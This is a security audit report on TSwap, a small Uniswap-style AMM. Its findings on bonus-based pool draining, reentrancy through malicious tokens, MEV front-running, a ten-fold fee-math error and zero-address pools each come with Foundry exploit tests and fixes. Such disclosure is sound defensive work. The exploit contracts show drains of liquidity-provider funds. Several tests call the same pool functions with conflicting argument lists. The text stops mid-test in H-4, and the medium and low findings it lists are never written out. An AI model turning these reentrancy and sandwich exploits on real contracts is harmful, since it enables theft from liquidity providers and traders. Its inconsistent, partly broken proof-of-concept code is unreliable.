# 5 t swap audit - Findings Report
## Commit hash: 55d1e086ed0917fd055b14f63099c2342eb6b86a

## Protocol Overview 

### TSwap in a Nutshell
TSwap is a lightweight Automated Market Maker (AMM) that mirrors Uniswap v1 but restricts every pool to **one ERC-20 token paired with WETH**. The system is composed of two contracts:

1. **PoolFactory** – deploys new pools and guarantees a one-to-one mapping between a token and its pool.
2. **TSwapPool** – an ERC-20 token itself (LP token) that holds the core logic for liquidity and swapping.

### How it Works
* **Adding Liquidity** – Providers deposit equal market value of WETH and the chosen token. The pool mints LP tokens proportional to their contribution; the first deposit enforces a `MINIMUM_WETH_LIQUIDITY` lock to prevent division-by-zero exploits.
* **Pricing Formula** – Swaps obey the constant-product invariant `x * y = k`. A 0.3 % fee is taken on every trade via a 997/1000 multiplier; fees stay inside the pool, automatically accruing to LPs.
* **Swapping** – Users call `swapExactInput` (known input, get max output) or `swapExactOutput` (desired output, pay min input). Functions internally route to `_swap`, which updates balances, enforces slippage constraints, and tracks `swap_count` for possible future incentives.
* **Removing Liquidity** – Burning LP tokens returns the caller’s proportional share of WETH and the paired token.

The result is a permissionless, on-chain venue where any ERC-20 can be traded against WETH with transparent fees and no order books.
## Critical Risk Findings
[C-1]. Access Control issue in TSwapPool::_swap
[C-2]. Reentrancy issue in TSwapPool::swapExactInput
[C-3]. Reentrancy issue in TSwapPool::_swap
## High Risk Findings
[H-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap
[H-2]. Zero Code issue in TSwapPool::constructor
[H-3]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput
[H-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens
## Medium Risk Findings
[M-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::swapExactOutput
[M-2]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput
[M-3]. Access Control issue in PoolFactory::constructor
[M-4]. Reentrancy issue in PoolFactory::createPool
[M-5]. Zero Code issue in PoolFactory::constructor
[M-6]. Integer Overflow/Math issue in TSwapPool::sellPoolTokens
[M-7]. Integer Overflow/Math issue in TSwapPool::deposit
[M-8]. DOS issue in PoolFactory::createPool
## Low Risk Findings
[L-1]. DOS issue in PoolFactory::createPool


### Number of Findings
- C: 3
- H: 4
- M: 8
- L: 1
- I: 0



# Critical Risk Findings

## [C-1]. Access Control issue in TSwapPool::_swap

## Description
The `_swap` function implements a "bonus" mechanism where every 10th swap, the caller receives an extra 1e18 of the output token, paid for by the pool's reserves. This drains capital directly from Liquidity Providers (LPs) without their knowledge or consent. LPs provide liquidity expecting to earn fees from trading activity, but this feature actively gives away their principal investment to traders. Over time, this will consistently reduce the value of LP shares, causing direct financial loss.

## Impact
Because every 10-th call to _swap gifts 1 WETH (1e18) from the pool’s reserves to the caller, any user can repeatedly cycle trivial swaps (e.g. 1 wei in / 1 wei out) and drain the entire WETH liquidity. The loss is permanent and directly steals LP funds without limitation, eventually reducing LP share value to zero.

## Proof of Concept
1. Provide liquidity (1000 WETH / 1000 PTKN).
2. Make 9 cheap swaps of 1 PTKN ➜ WETH.
3. On the 10th swap send another 1 PTKN.
4. Observe that the pool transfers `outputAmount + 1 WETH` to the caller although only `outputAmount` is owed, meaning LPs lost an extra 1 WETH.
5. Loop steps 2-4. An attacker spends negligible fees but receives 1 WETH every 10 swaps, draining the pool entirely.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "@openzeppelin/contracts/mocks/token/MockERC20.sol";

contract BonusDrainTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 ptkn;

    address lp = address(1);
    address attacker = address(2);

    function setUp() public {
        weth  = new MockERC20("WETH","WETH",18);
        ptkn  = new MockERC20("Pool Token","PTKN",18);
        pool  = new TSwapPool(address(ptkn), address(weth), "LP","LP");

        // LP provides liquidity
        uint256 liq = 1000 ether;
        weth.mint(lp, liq);
        ptkn.mint(lp, liq);
        vm.startPrank(lp);
        weth.approve(address(pool), liq);
        ptkn.approve(address(pool), liq);
        pool.deposit(liq, liq, liq, uint64(block.timestamp));
        vm.stopPrank();

        // attacker gets tokens to swap
        ptkn.mint(attacker, 10 ether);
        vm.prank(attacker);
        ptkn.approve(address(pool), 10 ether);
    }

    function testBonusDrain() public {
        // advance 9 swaps first
        vm.startPrank(attacker);
        for (uint i; i < 9; i++) {
            pool.swapExactInput(ptkn, 1 ether, weth, 0, uint64(block.timestamp));
        }

        // record balances before 10-th swap
        uint256 poolWethBefore = weth.balanceOf(address(pool));
        uint256 attackerWethBefore = weth.balanceOf(attacker);

        // compute normal output for 1 ether input
        uint256 outNoBonus = pool.getOutputAmountBasedOnInput(
            1 ether,
            ptkn.balanceOf(address(pool)),
            poolWethBefore
        );

        // 10-th swap triggers bonus
        pool.swapExactInput(ptkn, 1 ether, weth, 0, uint64(block.timestamp));
        vm.stopPrank();

        uint256 attackerWethAfter = weth.balanceOf(attacker);
        uint256 poolWethAfter = weth.balanceOf(address(pool));

        // attacker got normal output + 1 WETH bonus
        assertEq(attackerWethAfter - attackerWethBefore, outNoBonus + 1 ether, "bonus not received");
        // pool lost exactly 1 extra WETH
        assertEq(poolWethBefore - poolWethAfter, outNoBonus + 1 ether, "pool reserves wrong");
    }
}
```

## Suggested Mitigation
Remove the bonus mechanism entirely. It creates a perverse incentive and drains funds from liquidity providers, which is antithetical to the goal of an AMM. Fees should be collected for LPs, not have their capital given away.

```diff
-        swap_count++;
-        if (swap_count >= SWAP_COUNT_MAX) {
-            swap_count = 0;
-            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
-        }
```

## [C-2]. Reentrancy issue in TSwapPool::swapExactInput

## Description
The swap functions in `TSwapPool` do not implement reentrancy protection. The contract's state, represented by token balances, is read before external calls (`token.transfer`/`transferFrom`) are made. If a malicious token contract (e.g., ERC777 or a token with transfer hooks) is used in a pool, it can call back into the swap function after receiving its input tokens but before the output tokens are sent. This re-entrant call would observe an inconsistent state of reserves, allowing the attacker to perform a second swap at a highly favorable rate, effectively draining the pool's funds.

## Impact
An attacker can create a pool with a malicious ERC20 token and trick users into providing liquidity. The attacker can then exploit the reentrancy vulnerability to drain all the funds of the other asset (e.g., WETH) from the pool, leading to a total loss for liquidity providers.

## Proof of Concept
1. Attacker deploys MaliciousToken that overrides `transfer`.
2. Pool is funded with 100 WETH & 100 MAL by an honest LP.
3. Attacker swaps **WETH→MAL** (output token is MAL). `_swap` has already pulled 1 WETH in but has **not** yet sent MAL out.
4. During the outbound `MaliciousToken.transfer(attacker, …)` call, MaliciousToken re-enters **swapExactOutput** asking for 90 WETH in exchange for its own MAL (input=MaliciousToken). Because the pool WETH balance is now 101 (after step-3) while the MAL balance is still 100, the pricing function believes there is ample WETH liquidity and asks for far fewer MAL tokens than it should.
5. After the re-entrant call finishes, the first transfer returns and the pool finally sends the original MAL amount. The attacker exits with ~90 WETH for almost-zero cost, repeatable until the pool is empty.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../src/PoolFactory.sol";
import "../src/TSwapPool.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n,string memory s) ERC20(n,s) {}
    function mint(address to,uint256 amt) external { _mint(to,amt); }
}

contract MaliciousToken is ERC20 {
    TSwapPool public pool;
    address public attacker;
    bool internal reentered;

    constructor() ERC20("Mal","MAL") {}
    function setAttack(TSwapPool _pool,address _attacker) external { pool=_pool; attacker=_attacker; }

    function _afterTokenTransfer(address from,address to,uint256) internal override {
        if(!reentered && from==address(pool) && to==attacker) {
            reentered = true;
            // Drain 90 WETH using cheap price that sees 1 WETH already added
            pool.swapExactOutput(address(pool.getWethToken()), 90 ether, type(uint256).max);
        }
    }

    function mint(address to,uint256 amt) external { _mint(to,amt); }
}

contract ReentrancyDrainTest is Test {
    MockERC20 weth;
    MaliciousToken mal;
    PoolFactory factory;
    TSwapPool pool;
    address lp = makeAddr("LP");
    address attacker = makeAddr("ATT");

    function setUp() public {
        weth = new MockERC20("WETH","WETH");
        factory = new PoolFactory(address(weth));
        mal = new MaliciousToken();
        pool = TSwapPool(factory.createPool(address(mal)));
        mal.setAttack(pool, attacker);

        // LP provides liquidity
        mal.mint(lp, 100 ether);
        weth.mint(lp, 100 ether);
        vm.startPrank(lp);
        mal.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(100 ether, 100 ether, 0);
        vm.stopPrank();

        // attacker prep
        weth.mint(attacker, 1 ether);
        vm.prank(attacker);
        weth.approve(address(pool), type(uint256).max);
    }

    function testDrain() public {
        uint256 poolWethBefore = weth.balanceOf(address(pool));
        assertEq(poolWethBefore, 100 ether);

        // attacker triggers exploit: swap 1 WETH → MAL
        vm.prank(attacker);
        pool.swapExactInput(address(mal), 1 ether, 0);

        uint256 poolWethAfter = weth.balanceOf(address(pool));
        uint256 attackerWeth = weth.balanceOf(attacker);
        assertLt(poolWethAfter, 10 ether); // >90% drained
        assertGt(attackerWeth, 90 ether);
    }
}

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern or, more simply, inherit OpenZeppelin’s ReentrancyGuard and add the `nonReentrant` modifier to deposit/withdraw/swap functions. Additionally, compute pricing using *cached* reserves updated **after** the input transfer and **before** any external call, then write those reserves into storage so that re-entrant executions observe the new state.

## [C-3]. Reentrancy issue in TSwapPool::_swap

## Description
The `_swap` function has a reentrancy vulnerability due to an interaction happening before all state effects are finalized. When `swap_count` reaches `SWAP_COUNT_MAX`, the function transfers a bonus of 1 `outputToken` to `msg.sender`. This `safeTransfer` call occurs before the `inputToken.safeTransferFrom` call, which is responsible for pulling the swap's input tokens from the user. If the `outputToken` is a malicious contract (e.g., an ERC777 token or any token with a transfer hook), it can make a re-entrant call back into the `TSwapPool` contract. An attacker could exploit this to execute another function, such as `withdraw`, before their input funds for the swap have been collected by the pool. This violates the Checks-Effects-Interactions pattern and can lead to theft of funds from the liquidity pool.

## Impact
An attacker can drain funds from the liquidity pool. By re-entering the `withdraw` function during a swap, the attacker can remove their liquidity share before paying for the swap. This allows them to steal the assets they were supposed to pay as input for the swap, with the loss being socialized among the remaining liquidity providers.

## Proof of Concept
1. An attacker creates a malicious ERC20 token with a re-entrant callback in its `transfer` function.
2. A `TSwapPool` is created using WETH and the attacker's malicious token.
3. The attacker adds liquidity (e.g., 10 WETH and 10 malicious tokens) to this pool to receive LP tokens.
4. The attacker or other users perform 9 swaps in the pool to increment `swap_count` to 9.
5. The attacker calls `swapExactInput`, using WETH as input and their malicious token as output. This will be the 10th swap, triggering the bonus mechanism.
6. Inside `_swap`, `swap_count` becomes 10, the `if` condition is met, and `outputToken.safeTransfer(msg.sender, ...)` for the bonus is called.
7. The attacker's malicious token's `transfer` function is triggered, which immediately calls back into the `TSwapPool`'s `withdraw` function, burning all of the attacker's LP tokens.
8. The `withdraw` function calculates the attacker's share of WETH and malicious tokens based on the current pool balances. Since the WETH for the ongoing swap has not yet been transferred into the pool, the attacker successfully withdraws their full share of the pool's assets (10 WETH and 10 malicious tokens).
9. Control returns to the `_swap` function. It then attempts to execute `inputToken.safeTransferFrom` to pull the WETH for the swap. This call will now fail because the attacker has already withdrawn their WETH, but the damage is done. The attacker has essentially withdrawn their liquidity after initiating a swap they never paid for.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/* ─────────────────────────  MOCK TOKENS  ───────────────────────── */

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract MaliciousToken is ERC20 {
    TSwapPool public pool;
    address public attacker;

    constructor() ERC20("Malicious", "MAL") {
        attacker = msg.sender;            // test contract – will send to real attacker later
        _mint(address(this), 2_000_000 ether); // large supply
    }

    function setPool(address _pool) external { pool = TSwapPool(_pool); }

    // Re-entrancy on bonus transfer
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (to == attacker && address(pool) != address(0)) {
            uint256 lp = pool.balanceOf(attacker);
            if (lp > 0) {
                pool.withdraw(lp, 1, 1, uint64(block.timestamp));
            }
        }
        return super.transfer(to, amount);
    }
}

/* ───────────────────────────  TEST  ───────────────────────────── */

contract ReentrancyAttackTest is Test {
    TSwapPool pool;
    MockERC20  weth;
    MaliciousToken mal;
    address attacker = address(1);
    address user     = address(2);

    function setUp() public {
        // Deploy mock tokens
        weth = new MockERC20("WETH", "WETH");
        mal  = new MaliciousToken();

        // Give attacker tokens
        weth.mint(attacker, 100 ether);
        mal.transfer(attacker, 1_000_000 ether);

        // Deploy pool under attacker context so LP tokens are owned by attacker
        vm.startPrank(attacker);
        pool = new TSwapPool(address(mal), address(weth), "LP", "LP");
        mal.setPool(address(pool));

        // Approvals & initial liquidity
        weth.approve(address(pool), type(uint256).max);
        mal.approve(address(pool), type(uint256).max);
        pool.deposit(10 ether, 1, 10 ether, uint64(block.timestamp));
        vm.stopPrank();

        // Prime swap counter to 9 with a benign user
        weth.mint(user, 10 ether);
        vm.startPrank(user);
        weth.approve(address(pool), type(uint256).max);
        for (uint i; i < 9; i++) {
            pool.swapExactInput(weth, 1 ether, mal, 1, uint64(block.timestamp));
        }
        vm.stopPrank();
    }

    function testReentrancyDrain() public {
        uint256 wethBefore = weth.balanceOf(attacker);

        vm.startPrank(attacker);
        pool.swapExactInput(weth, 1 ether, mal, 1, uint64(block.timestamp)); // triggers bonus + re-entrancy
        vm.stopPrank();

        uint256 wethAfter = weth.balanceOf(attacker);

        assertGt(wethAfter, wethBefore, "Attacker should profit in WETH");
        assertEq(pool.balanceOf(attacker), 0, "LP tokens should be burned by re-entrancy");
    }
}

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern strictly. Ensure all state changes and token transfers related to the primary logic of a function are completed before any external calls that could lead to re-entrancy, such as a bonus payout. A `nonReentrant` modifier from OpenZeppelin could also be used to lock the contract during the execution of `_swap`.

```solidity
// Add nonReentrant modifier from OpenZeppelin
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TSwapPool is ERC20, ReentrancyGuard {
    // ...

    function _swap(
        IERC20 inputToken,
        uint256 inputAmount,
        IERC20 outputToken,
        uint256 outputAmount
    ) private nonReentrant { // Apply lock
        if (
            _isUnknown(inputToken) ||
            _isUnknown(outputToken) ||
            inputToken == outputToken
        ) {
            revert TSwapPool__InvalidToken();
        }

        // Perform main swap transfers first (Effects)
        emit Swap(
            msg.sender,
            inputToken,
            inputAmount,
            outputToken,
            outputAmount
        );

        inputToken.safeTransferFrom(msg.sender, address(this), inputAmount);
        outputToken.safeTransfer(msg.sender, outputAmount);

        // Handle bonus payout last (Interaction)
        swap_count++;
        if (swap_count >= SWAP_COUNT_MAX) {
            swap_count = 0;
            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
        }
    }

    // ...
}
```



# High Risk Findings

## [H-1]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::_swap

## Description
The `_swap` function provides a bonus of 1 token to the caller on every 10th swap. The `swap_count` variable that tracks this is public, making the bonus distribution predictable. An attacker can monitor the `swap_count` in the contract's storage. When the count reaches 9, they can watch the mempool for any incoming swap transaction and front-run it with their own minimal swap to claim the bonus. This makes the incentive mechanism unfair and systematically exploitable by MEV bots, at the expense of regular users.

Vulnerable Code Snippet from `_swap`:
```solidity
    function _swap(
        // ...
    ) private {
        // ...
        swap_count++;
        if (swap_count >= SWAP_COUNT_MAX) { // SWAP_COUNT_MAX is 10
            swap_count = 0;
            outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000);
        }
        // ...
    }
```

## Impact
The bonus mechanism is consistently gameable, leading to a poor user experience and the systematic theft of rewards intended for the protocol's users. It creates a toxic MEV environment where only sophisticated bots can profit from the incentive, while regular users bear the cost of higher gas fees during contention for the bonus-triggering swap.

## Proof of Concept
1. An MEV bot continuously monitors the `swap_count` storage slot of the `TSwapPool` contract.
2. When `swap_count` is 9, the bot starts monitoring the mempool for any transactions calling a swap function on the pool.
3. A legitimate user, Alice, submits a `swapExactInput` transaction with a standard gas price.
4. The bot sees Alice's transaction, and immediately submits its own `swapExactInput` transaction for a negligible amount but with a much higher gas price to ensure it gets mined first.
5. The bot's transaction is executed first. It increments `swap_count` to 10, receives the bonus of 1 token, and resets `swap_count` to 0.
6. Alice's transaction is executed next. It increments `swap_count` from 0 to 1, and she receives no bonus.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import {TSwapPool} from "../src/TSwapPool.sol";

contract FrontrunTest is Test {
    TSwapPool pool;
    ERC20Mock poolToken;
    ERC20Mock weth;

    address alice = address(1);
    address attacker = address(2);

    function setUp() public {
        // Deploy mock tokens with zero initial supply
        poolToken = new ERC20Mock("POOL", "POOL", address(this), 0);
        weth      = new ERC20Mock("WETH", "WETH", address(this), 0);

        pool      = new TSwapPool(address(poolToken), address(weth), "LP", "LP");

        // Provide initial liquidity to the pool (1 000 WETH / 1 000 POOL)
        poolToken.mint(address(this), 1_000 ether);
        weth.mint(address(this),      1_000 ether);
        poolToken.approve(address(pool), type(uint256).max);
        weth.approve(address(pool),      type(uint256).max);
        pool.deposit(1_000 ether, 1, 1_000 ether, uint64(block.timestamp));

        // Fund users
        poolToken.mint(alice,    100 ether);
        poolToken.mint(attacker, 100 ether);

        vm.prank(alice);
        poolToken.approve(address(pool), type(uint256).max);

        vm.prank(attacker);
        poolToken.approve(address(pool), type(uint256).max);
    }

    function test_AttackerGetsBonusByFrontRunning() public {
        // Bring swap_count to 9
        for (uint256 i = 0; i < 9; i++) {
            vm.prank(address(this));
            pool.swapExactInput(poolToken, 1 ether, weth, 0, uint64(block.timestamp));
        }

        // Attacker front-runs with a tiny swap (10th swap)
        vm.prank(attacker);
        pool.swapExactInput(poolToken, 1, weth, 0, uint64(block.timestamp));

        // Alice’s genuine swap (will be 1st of next cycle)
        vm.prank(alice);
        pool.swapExactInput(poolToken, 1 ether, weth, 0, uint64(block.timestamp));

        // The attacker must have received at least the 1 WETH bonus
        assertGe(weth.balanceOf(attacker), 1 ether);
        // Alice receives <1 WETH (no bonus)
        assertLt(weth.balanceOf(alice), 1 ether);
    }
}


## Suggested Mitigation
Predictable rewards on-chain are almost always vulnerable to front-running. This incentive mechanism should be redesigned. Instead of giving a bonus on the Nth swap, the fees accumulated by the protocol could be distributed pro-rata to liquidity providers, which is a standard and more robust AMM design. If a direct user incentive is desired, it should rely on an unpredictable mechanism, for example, using a commit-reveal scheme or Chainlink VRF, although this would add significant complexity. The simplest and safest mitigation is to remove the bonus mechanism entirely.

```solidity
// In _swap function
// Remove the entire if-block related to swap_count

// swap_count++; // REMOVE
// if (swap_count >= SWAP_COUNT_MAX) { // REMOVE
//     swap_count = 0; // REMOVE
//     outputToken.safeTransfer(msg.sender, 1_000_000_000_000_000_000); // REMOVE
// } // REMOVE
```

## [H-2]. Zero Code issue in TSwapPool::constructor

## Description
The constructor of `TSwapPool` does not check if the provided `poolToken` and `wethToken` addresses are `address(0)`. If a pool is created with a zero address for either token, all subsequent interactions with that token within the pool will revert. This would render the pool permanently broken and any initial liquidity deposited could be locked, as functions like `withdraw` and `swap` would become unusable.

## Impact
If a pool is deployed with poolToken == address(0) (or wethToken == address(0)), the first liquidity provider can successfully deposit WETH, receive LP tokens, but will never be able to withdraw because every function that later calls `IERC20.balanceOf` on the zero address reverts when decoding the empty return data. All WETH sent to the pool is therefore permanently frozen and the pool becomes unusable. Anyone can deploy such a broken pool through the permissionless factory, so the issue can occur on main-net without any privileged action.

## Proof of Concept
1. Attacker (or a mis-configured script) calls `PoolFactory.createPool(address(0))`, creating a pool whose `poolToken` is the zero address.
2. Liquidity provider deposits WETH for the first time:
   - `deposit()` enters the _initial_ branch (`totalSupply() == 0`) and transfers real WETH into the contract, while the `safeTransferFrom` on the zero address is a no-op that still returns success.
   - Liquidity provider receives LP tokens.
3. Later, when the provider (or anybody) calls `withdraw()`, the function executes `i_poolToken.balanceOf(address(this))`. Because `i_poolToken` is the zero address, the low-level `staticcall` succeeds with empty data and Solidity tries to decode a `uint256`, which triggers a revert.
4. All WETH locked in step 2 can never be recovered; the pool is bricked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract ERC20Mock is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract ZeroAddressConstructorTest is Test {
    ERC20Mock weth;
    TSwapPool pool;

    function setUp() public {
        weth = new ERC20Mock("WETH", "WETH");
        pool = new TSwapPool(address(0), address(weth), "LP", "LP");
    }

    function testFundsAreLocked() public {
        // prepare liquidity provider
        weth.mint(address(this), 10 ether);
        weth.approve(address(pool), type(uint256).max);

        // initial deposit succeeds even though poolToken is zero address
        pool.deposit(1 ether, 1, 0, uint64(block.timestamp + 1));
        assertEq(weth.balanceOf(address(pool)), 1 ether, "WETH transferred");

        // try to withdraw -> expect revert because balanceOf on zero address reverts when decoding
        uint256 lpBalance = pool.balanceOf(address(this));
        pool.approve(address(pool), lpBalance);
        vm.expectRevert();
        pool.withdraw(lpBalance, 1, 1, uint64(block.timestamp + 1));
    }
}

## Suggested Mitigation
In the constructor add:
require(poolToken != address(0) && wethToken != address(0), "Zero address");
require(poolToken != wethToken, "Identical token");
require(Address.isContract(poolToken) && Address.isContract(wethToken), "EOA provided");
Revert with TSwapPool__InvalidToken() for any failure.

## [H-3]. Integer Overflow/Math issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The function `getInputAmountBasedOnOutput` incorrectly calculates the required input amount for a swap. The numerator is multiplied by `10000`, whereas the correct constant, based on the fee structure described (0.3% fee), should be `1000`. This error causes the function to calculate a required input amount that is exactly 10 times larger than it should be.

## Impact
Users calling `swapExactOutput` or any function that relies on `getInputAmountBasedOnOutput` (like `sellPoolTokens`) will be forced to transfer 10 times the correct amount of input tokens to the pool. This leads to immediate and significant financial loss for the user, with the excess funds being captured by liquidity providers.

## Proof of Concept
1. An LP provides 100 WETH and 100,000 PoolToken to the pool.
2. A user wants to receive exactly 10 WETH (`outputAmount`) by calling `swapExactOutput`.
3. The correct required input of PoolToken should be `(100000 * 10 * 1000) / ((100 - 10) * 997)` which is approximately 11,144 PoolToken.
4. The flawed contract calculates `(100000 * 10 * 10000) / ((100 - 10) * 997)`, resulting in approximately 111,440 PoolToken.
5. The user is charged 100,296 more PoolTokens than necessary, which is a direct loss of funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// ---------------------------------------------------------------------------
// Minimal ERC20 with public mint for testing purposes
// ---------------------------------------------------------------------------
contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract TSwapPool_IncorrectMath_Test is Test {
    TSwapPool private pool;
    MockERC20 private weth;
    MockERC20 private poolToken;

    address private lp    = address(0xA11CE);
    address private user  = address(0xB0B);

    function setUp() public {
        // deploy mocks
        weth      = new MockERC20("Wrapped ETH", "WETH");
        poolToken = new MockERC20("Pool Token", "PT");

        // deploy pool
        pool = new TSwapPool(address(poolToken), address(weth), "LPToken", "LP");

        // provide initial liquidity (LP)
        uint256 wethLiquidity      = 100 ether;        // 100 WETH
        uint256 poolTokenLiquidity = 100_000 ether;    // 100 000 PT

        weth.mint(lp, wethLiquidity);
        poolToken.mint(lp, poolTokenLiquidity);

        vm.startPrank(lp);
        weth.approve(address(pool), wethLiquidity);
        poolToken.approve(address(pool), poolTokenLiquidity);
        pool.deposit(wethLiquidity, 0, poolTokenLiquidity, uint64(block.timestamp + 1));
        vm.stopPrank();

        // fund user with pool tokens
        poolToken.mint(user, 200_000 ether);
    }

    function test_getInputAmountBasedOnOutput_is10xOff() public {
        uint256 outputWeth = 10 ether; // user wants 10 WETH

        uint256 inputReserves  = poolToken.balanceOf(address(pool));
        uint256 outputReserves = weth.balanceOf(address(pool));

        // correct vs flawed calculation
        uint256 correctInput = (inputReserves * outputWeth * 1000) / ((outputReserves - outputWeth) * 997);
        uint256 flawedInput  = pool.getInputAmountBasedOnOutput(outputWeth, inputReserves, outputReserves);

        assertEq(flawedInput, correctInput * 10, "Math error should be exactly 10x");

        // perform swap to show real loss
        vm.prank(user);
        poolToken.approve(address(pool), flawedInput);

        uint256 balanceBefore = poolToken.balanceOf(user);
        vm.prank(user);
        pool.swapExactOutput(poolToken, weth, outputWeth, uint64(block.timestamp + 1));
        uint256 balanceAfter = poolToken.balanceOf(user);

        assertEq(balanceBefore - balanceAfter, flawedInput, "User paid flawedInput");
    }
}

## Suggested Mitigation
The constant in the numerator of the `getInputAmountBasedOnOutput` calculation must be changed from `10000` to `1000` to correctly reflect the 0.3% fee.

```solidity
function getInputAmountBasedOnOutput(
    uint256 outputAmount,
    uint256 inputReserves,
    uint256 outputReserves
) public pure returns (uint256 inputAmount) {
    // ... checks ...
    return
        // FIX: Change 10000 to 1000
        ((inputReserves * outputAmount) * 1000) /
        ((outputReserves - outputAmount) * 997);
}
```

## [H-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function is a wrapper around `swapExactOutput`. It has two major flaws: 
1. **Logical Bug**: The function name `sellPoolTokens` and its parameter `poolTokenAmount` imply the user is selling a specific amount of pool tokens. However, it calls `swapExactOutput` where `poolTokenAmount` is used as the *output* amount of WETH the user wants to receive. The function's return value `wethAmount` is also misnamed; it actually returns the `inputAmount` of pool tokens taken from the user. This is extremely confusing and will lead to unexpected behavior for users.
2. **Front-running Vulnerability**: The function hardcodes the deadline to `block.timestamp`, giving the user no protection against their transaction sitting in the mempool and being executed at a much worse price. More importantly, it provides no slippage protection. An attacker can easily sandwich attack any call to this function, manipulating the price to force the user to pay a much higher input amount of pool tokens for the WETH they receive, extracting value from the user.

## Impact
Because `sellPoolTokens` interprets the supplied `poolTokenAmount` as *output* WETH and not as the amount of pool tokens to sell, the function will internally calculate whatever pool-token input is required to obtain that many WETH and pull it from the caller via `transferFrom`. When the price moves (naturally or by a sandwich attacker) there is **no bound at all** on how many pool tokens the user will lose—up to their full wallet balance or allowance. The bug therefore enables a third party to drain an unlimited amount of the victim’s pool tokens whenever the victim’s transaction can be re-ordered in the mempool.

## Proof of Concept
1. Victim approves TSwapPool for 1 000 pool tokens and calls `sellPoolTokens(100 ether)` believing she is selling exactly 100 pool tokens.
2. Internally the pool treats the parameter as a request to RECEIVE 100 WETH. Suppose the fair price is 1 WETH = 1 poolToken; the call would therefore cost 100 pool tokens.
3. An attacker detects the transaction in the mempool and front-runs with a large `swapExactInput`, raising the price of WETH so that 1 WETH now costs 5 pool tokens.
4. When the victim’s tx executes, the pool computes the new input requirement: 100 WETH × 5 = 500 pool tokens, and transfers those 500 tokens from the victim (well above what was intended).
5. The attacker back-runs, restoring the price and pocketing the difference, while the victim irrevocably lost an extra 400 pool tokens.
6. Because the wrapper offers neither `deadline` (other than `now`) nor `maxInput` / `minOutput` parameters, this loss is unavoidable once the transaction sits in the mempool.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract SellPoolTokensSandwichTest is Test {
    MockERC20 weth;
    MockERC20 poolToken;
    TSwapPool pool;
    address victim = address(1);
    address attacker = address(2);

    function setUp() public {
        weth = new MockERC20("WETH", "WETH");
        poolToken = new MockERC20("PTKN", "PTKN");
        pool = new TSwapPool(address(poolToken), address(weth), "LP", "LP");

        // seed liquidity provider
        poolToken.mint(address(this), 1_000 ether);
        weth.mint(address(this), 1_000 ether);
        poolToken.approve(address(pool), type(uint256).max);
        weth.approve(address(pool), type(uint256).max);
        pool.deposit(1_000 ether, 1, 1_000 ether, uint64(block.timestamp));

        // seed victim & attacker
        poolToken.mint(victim, 1_000 ether);
        poolToken.mint(attacker, 1_000 ether);
        vm.prank(victim);
        poolToken.approve(address(pool), type(uint256).max);
        vm.prank(attacker);
        poolToken.approve(address(pool), type(uint256).max);
    }

    function testSandwich() public {
        uint256 targetWethOut = 100 ether; // victim believes she is *selling* 100 PTKN

        // Expected cost before manipulation
        uint256 honestCost = pool.getInputAmountBasedOnOutput(
            targetWethOut,
            poolToken.balanceOf(address(pool)),
            weth.balanceOf(address(pool))
        );

        // attacker front-runs – buy 500 WETH pushing price up
        vm.startPrank(attacker);
        pool.swapExactInput(poolToken, 500 ether, weth, 1, uint64(block.timestamp));
        vm.stopPrank();

        // victim transaction executes
        vm.startPrank(victim);
        uint256 spent = pool.sellPoolTokens(targetWethOut);
        vm.stopPrank();

        // attacker back-runs – restore price and take profit
        vm.startPrank(attacker);
        weth.approve(address(pool), weth.balanceOf(attacker));
